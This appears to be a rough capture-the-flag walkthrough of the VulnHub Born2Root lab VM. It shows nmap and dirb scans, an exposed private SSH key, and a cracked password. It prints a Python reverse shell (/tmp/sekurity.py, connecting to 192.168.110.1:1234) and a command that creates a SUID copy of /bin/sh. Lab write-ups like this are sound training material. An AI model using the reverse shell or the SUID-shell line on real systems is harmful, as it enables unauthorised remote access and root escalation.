https://infosecjohn.blog/posts/vulnhub-born2root-1/
https://www.hackingarticles.in/hack-born2root-vm-ctf-challenge/


# Description

When you see the ascii text that mean Born2Root's CTF challenge Is UP

- Hack it , reach root and capture the flag.
- Born2root is based on debian 32 bits so you can run it even if Intel VT-X isn't installed .
- Enumeration is the key.
- Level: Intermediate


# Scan `nmap`

    $ sudo nmap -sT -A -Pn -n -p- 192.168.110.6
    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-13 21:45 CEST
    Nmap scan report for 192.168.110.6
    Host is up (0.0012s latency).
    Not shown: 65531 closed ports
    PORT      STATE SERVICE VERSION
    22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
    | ssh-hostkey: 
    |   1024 3d:6f:40:88:76:6a:1d:a1:fd:91:0f:dc:86:b7:81:13 (DSA)
    |   2048 eb:29:c0:cb:eb:9a:0b:52:e7:9c:c4:a6:67:dc:33:e1 (RSA)
    |   256 d4:02:99:b0:e7:7d:40:18:64:df:3b:28:5b:9e:f9:07 (ECDSA)
    |_  256 e9:c4:0c:6d:4b:15:4a:58:4f:69:cd:df:13:76:32:4e (ED25519)
    80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
    | http-robots.txt: 2 disallowed entries 
    |_/wordpress-blog /files
    |_http-server-header: Apache/2.4.10 (Debian)
    |_http-title:  Secretsec Company 
    111/tcp   open  rpcbind 2-4 (RPC #100000)
    | rpcinfo: 
    |   program version    port/proto  service
    |   100000  2,3,4        111/tcp   rpcbind
    |   100000  2,3,4        111/udp   rpcbind
    |   100000  3,4          111/tcp6  rpcbind
    |   100000  3,4          111/udp6  rpcbind
    |   100024  1          33100/tcp   status
    |   100024  1          46196/tcp6  status
    |   100024  1          47878/udp   status
    |_  100024  1          54836/udp6  status
    33100/tcp open  status  1 (RPC #100024)
    MAC Address: 08:00:27:E8:AF:79 (Oracle VirtualBox virtual NIC)
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    TRACEROUTE
    HOP RTT     ADDRESS
    1   1.18 ms 192.168.110.6

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 14.12 seconds



http://192.168.110.6/
Martin N
Hadi M
Jimmy S
martin@secretsec.com


└─$ curl http://192.168.110.6/robots.txt  
User-agent: *
Disallow: /wordpress-blog
Disallow: /files

gobuster dir -u http://192.168.110.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt


martin
hadi
jimmy



└─$ dirb http://192.168.110.6/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Apr 14 09:12:06 2021
URL_BASE: http://192.168.110.6/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.110.6/ ----
==> DIRECTORY: http://192.168.110.6/files/                                               
==> DIRECTORY: http://192.168.110.6/icons/                                               
+ http://192.168.110.6/index.html (CODE:200|SIZE:5651)                                   
==> DIRECTORY: http://192.168.110.6/manual/                                              
+ http://192.168.110.6/robots.txt (CODE:200|SIZE:57)                                     
+ http://192.168.110.6/server-status (CODE:403|SIZE:302)                                 
 

└─$ curl http://192.168.110.6/icons/VDSoyuAXiO.txt

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAoNgGGOyEpn/txphuS2pDA1i2nvRxn6s8DO58QcSsY+/Nm6wC
tprVUPb+fmkKvOf5ntACY7c/5fM4y83+UWPG0l90WrjdaTCPaGAHjEpZYKt0lEc0
FiQkXTvJS4faYHNah/mEvhldgTc59jeX4di0f660mJjF31SA9UgMLQReKd5GKtUx
5m+sQq6L+VyA2/6GD/T3qx35AT4argdk1NZ9ONmj1ZcIp0evVJvUul34zuJZ5mDv
DZuLRR6QpcMLJRGEFZ4qwkMZn7NavEmfX1Yka6mu9iwxkY6iT45YA1C4p7NEi5yI
/P6kDxMfCVELAUaU8fcPolkZ6xLdS6yyThZHHwIDAQABAoIBAAZ+clCTTA/E3n7E
LL/SvH3oGQd16xh9O2FyR4YIQMWQKwb7/OgOfEpWjpPf/dT+sK9eypnoDiZkmYhw
+rGii6Z2wCXhjN7wXPnj1qotXkpu4bgS3+F8+BLjlQ79ny2Busf+pQNf1syexDJS
sEkoDLGTBiubD3Ii4UoF7KfsozihdmQY5qud2c4iE0ioayo2m9XIDreJEB20Q5Ta
lV0G03unv/v7OK3g8dAQHrBR9MXuYiorcwxLAe+Gm1h4XanMKDYM5/jW4JO2ITAn
kPducC9chbM4NqB3ryNCD4YEgx8zWGDt0wjgyfnsF4fiYEI6tqAwWoB0tdqJFXAy
FlQJfYECgYEAz1bFCpGBCApF1k/oaQAyy5tir5NQpttCc0L2U1kiJWNmJSHk/tTX
4+ly0CBUzDkkedY1tVYK7TuH7/tOjh8M1BLa+g+Csb/OWLuMKmpoqyaejmoKkLnB
WVGkcdIulfsW7DWVMS/zA8ixJpt7bvY7Y142gkurxqjLMz5s/xT9geECgYEAxpfC
fGvogWRYUY07OLE/b7oMVOdBQsmlnaKVybuKf3RjeCYhbiRSzKz05NM/1Cqf359l
Wdznq4fkIvr6khliuj8GuCwv6wKn9+nViS18s1bG6Z5UJYSRJRpviCS+9BGShG1s
KOf1fAWNwRcn1UKtdQVvaLBX9kIwcmTBrl+e6P8CgYAtz24Zt6xaqmpjv6QKDxEq
C1rykAnx0+AKt3DVWYxB1oRrD+IYq85HfPzxHzOdK8LzaHDVb/1aDR0r2MqyfAnJ
kaDwPx0RSN++mzGM7ZXSuuWtcaCD+YbOxUsgGuBQIvodlnkwNPfsjhsV/KR5D85v
VhGVGEML0Z+T4ucSNQEOAQKBgQCHedfvUR3Xx0CIwbP4xNHlwiHPecMHcNBObS+J
4ypkMF37BOghXx4tCoA16fbNIhbWUsKtPwm79oQnaNeu+ypiq8RFt78orzMu6JIH
dsRvA2/Gx3/X6Eur6BDV61to3OP6+zqh3TuWU6OUadt+nHIANqj93e7jy9uI7jtC
XXDmuQKBgHZAE6GTq47k4sbFbWqldS79yhjjLloj0VUhValZyAP6XV8JTiAg9CYR
2o1pyGm7j7wfhIZNBP/wwJSC2/NLV6rQeH7Zj8nFv69RcRX56LrQZjFAWWsa/C43
rlJ7dOFH7OFQbGp51ub88M1VOiXR6/fU8OMOkXfi1KkETj/xp6t+
-----END RSA PRIVATE KEY-----


└─$ ssh martin@192.168.110.14 -i key 
sign_and_send_pubkey: no mutual signature supported
martin@192.168.110.14's password: 


┌──(kali㉿kali)-[~/OSCP/boxes/born2root-1]
└─$ ssh martin@192.168.110.14 -i key    

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun  9 20:31:29 2017 from 192.168.0.42

READY TO ACCESS THE SECRET LAB ? 

secret password : 
WELCOME ! 
martin@debian:~$ 




martin@debian:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5   * * * *   jimmy   python /tmp/sekurity.py


martin@debian:~$ cat /tmp/sekurity.py 


import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.110.1",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])



import os; os.system('cp /bin/sh /tmp/sh'); os.system('chmod 4755 /tmp/sh');






hadi : hadi123

cupp
john
cewl
crunch



# Boxe

.bashrc
```bash
...
/var/tmp/login.py
```
```python

martin@debian:~$ cat /var/tmp/login.py
#!/usr/bin/python

import os

print("")
print("READY TO ACCESS THE SECRET LAB ? ")
print("")
password = raw_input("secret password : ")

if (password) == "secretsec" or "secretlab" :
        print("WELCOME ! ")
else:
        print("GET OUT ! ")
        os.system("pkill -u 'martin'")
```
